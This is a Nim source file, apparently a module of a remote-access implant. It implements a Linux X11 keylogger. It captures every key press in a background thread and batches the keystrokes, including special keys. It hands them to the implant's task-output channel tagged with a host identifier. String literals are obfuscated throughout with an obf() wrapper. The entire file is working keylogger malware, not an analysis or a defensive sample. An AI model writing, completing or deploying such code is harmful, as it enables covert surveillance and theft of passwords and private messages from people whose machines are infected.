import std/json
from std/locks import Lock, initLock, acquire, release
from std/random import rand
from std/strutils import join, startsWith, strip, toHex, toLowerAscii
import ../utils/global
import ../utils/tasks/buffer
import execution
import ../utils/linapi/handlers

const keyloggerIdleMs = 3_000'u64

var
  active = false
  parked = true
  th: Pthread
  thActive = false
  batch: seq[string]
  klMtx: Lock
  klReady = false
  klLastKeyMs = 0'u64

proc ensureKlMtx() =
  # Initializes the key logger lock once
  if not klReady:
    initLock(klMtx)
    klReady = true

proc paramsHasMethod(params: string): bool =
  # Checks that the params contain a method field
  if params.len == 0:
    return false
  try:
    parseJson(params).hasKey(obf("method"))
  except JsonParsingError:
    false

proc keysymFFLabel(ks: culong): string =
  # Returns the function key label for a keysym
  let v = ks.int
  if v >= 0xFFBE and v <= 0xFFC9:
    return obf("f") & $(v - 0xFFBE + 1)
  ""

proc keysymLabel(ks: culong): string =
  # Returns a readable label for a keysym
  if ks == culong(0x20):
    return obf("space")
  if ks >= 0x20 and ks <= 0x7e:
    return $char(ks.int)
  let ff = keysymFFLabel(ks)
  if ff.len > 0:
    return ff
  case ks
  of culong(0xff08): obf("backspace")
  of culong(0xff09): obf("tab")
  of culong(0xff0d): obf("enter")
  of culong(0xff1b): obf("esc")
  of culong(0xffff): obf("delete")
  of culong(0xff50): obf("home")
  of culong(0xff51): obf("left")
  of culong(0xff52): obf("up")
  of culong(0xff53): obf("right")
  of culong(0xff54): obf("down")
  of culong(0xff55): obf("pageup")
  of culong(0xff56): obf("pagedown")
  of culong(0xff57): obf("end")
  of culong(0xff63): obf("insert")
  of culong(0xff14): obf("scroll")
  of culong(0xff13): obf("pause")
  of culong(0xff61): obf("print")
  of culong(0xff7f): obf("num")
  of culong(0xffe1): obf("lshift")
  of culong(0xffe2): obf("rshift")
  of culong(0xffe3): obf("lctrl")
  of culong(0xffe4): obf("rctrl")
  of culong(0xffe5): obf("caps")
  of culong(0xffe7): obf("lmeta")
  of culong(0xffe8): obf("rmeta")
  of culong(0xffe9): obf("lalt")
  of culong(0xffea): obf("ralt")
  of culong(0xffeb): obf("lsuper")
  of culong(0xffec): obf("rsuper")
  else:
    if ks >= culong(0x41) and ks <= culong(0x5a):
      ($char(ks.int)).toLowerAscii()
    elif ks >= culong(0x30) and ks <= culong(0x39):
      $char(ks.int)
    elif ks >= culong(0xFF00) and ks <= culong(0xFFFF):
      obf("ks_") & toHex(ks.int, 4)
    else:
      obf("ks_") & toHex(ks.int, 4)

proc isSpecialKey(label: string): bool =
  # Checks that the label is a special key
  if label.len == 0:
    return false
  if label.startsWith(obf("ks_")):
    return true
  if label.len >= 2 and label[0] == 'f':
    let n = label[1 .. ^1]
    if n.len == 1 and n[0] in {'1'..'9'}:
      return true
    if n.len == 2 and n[0] == '1' and n[1] in {'0'..'2'}:
      return true
  case label
  of obf("backspace"), obf("tab"), obf("enter"), obf("esc"), obf("space"),
     obf("left"), obf("up"), obf("right"), obf("down"), obf("delete"),
     obf("home"), obf("end"), obf("insert"), obf("pageup"), obf("pagedown"),
     obf("print"), obf("pause"), obf("caps"), obf("num"), obf("scroll"),
     obf("lshift"), obf("rshift"), obf("lctrl"), obf("rctrl"),
     obf("lalt"), obf("ralt"), obf("lmeta"), obf("rmeta"),
     obf("lsuper"), obf("rsuper"):
    true
  else:
    false

proc fmtKey(label: string): string =
  # Formats a key label for the output
  if isSpecialKey(label):
    obf(" <") & label & obf("> ")
  else:
    label

proc flushBatch() =
  # Stores the pending keys as task output
  acquire(klMtx)
  if batch.len == 0:
    release(klMtx)
    return
  let content = batch.join(obf("")) & " "
  batch.setLen(0)
  release(klMtx)
  discard apply_task_output($(%*{
    obf("option"): obf("output"),
    obf("type"): obf("keylogger"),
    obf("task_tag"): $rand(100_000_000 .. 999_999_999),
    obf("host_tag"): hostTag,
    obf("content"): content,
  }))

proc addKey(label: string) =
  # Stores one key in the current batch
  acquire(klMtx)
  batch.add fmtKey(label)
  klLastKeyMs = getTickCount().uint64
  release(klMtx)

proc stop*() =
  # Stops the key logger and flushes the batch
  ensureKlMtx()
  acquire(klMtx)
  active = false
  release(klMtx)
  if not thActive:
    flushBatch()
    return
  for _ in 0 ..< 500:
    ensureKlMtx()
    acquire(klMtx)
    let p = parked
    release(klMtx)
    if p: break
    sleepMs(10)
  flushBatch()

proc workerMain(_: pointer): pointer {.noconv.} =
  # Main loop that reads key presses and stores them
  defer:
    dec bgWorkers
  var session = startX11KeySession()
  if not session.ok:
    ensureKlMtx()
    acquire(klMtx)
    active = false
    parked = true
    release(klMtx)
    return nil
  defer:
    stopX11KeySession(session)
  var last: seq[bool]
  while true:
    ensureKlMtx()
    acquire(klMtx)
    if not active:
      parked = true
      release(klMtx)
      flushBatch()
      sleepMs(50)
      continue
    parked = false
    release(klMtx)

    let presses = readX11KeyPresses(session, last)
    for ks in presses:
      addKey(keysymLabel(ks))
    ensureKlMtx()
    acquire(klMtx)
    let pending = batch.len > 0
    let lastKey = klLastKeyMs
    release(klMtx)
    if pending and lastKey > 0 and getTickCount().uint64 - lastKey >= keyloggerIdleMs:
      flushBatch()
      acquire(klMtx)
      klLastKeyMs = 0
      release(klMtx)
    sleepMs(50)
  nil

proc run_keylogger_start*(params: string; buf: var openArray[char]): int =
  # Entrypoint that starts the key logger
  let pre = pretestKeylog()
  if pre.len > 0:
    return writeMsg(obf("Error: ") & pre, buf)
  ensureKlMtx()
  acquire(klMtx)
  if thActive and active:
    release(klMtx)
    return writeMsg(obf("Error: keylogger already running"), buf)
  let needThread = not thActive
  active = true
  parked = false
  batch.setLen(0)
  klLastKeyMs = 0
  release(klMtx)

  if needThread:
    inc bgWorkers
    var tid: Pthread
    if not spawnPthread(tid, workerMain, nil):
      dec bgWorkers
      ensureKlMtx()
      acquire(klMtx)
      active = false
      release(klMtx)
      return writeMsg(obf("Error: keylogger start failed"), buf)
    ensureKlMtx()
    acquire(klMtx)
    th = tid
    thActive = true
    release(klMtx)

  writeMsg(obf("Keylogger started."), buf)

proc run_keylogger_stop*(_: string; buf: var openArray[char]): int =
  # Entrypoint that stops the key logger
  stop()
  writeMsg(obf("Keylogger stopped."), buf)
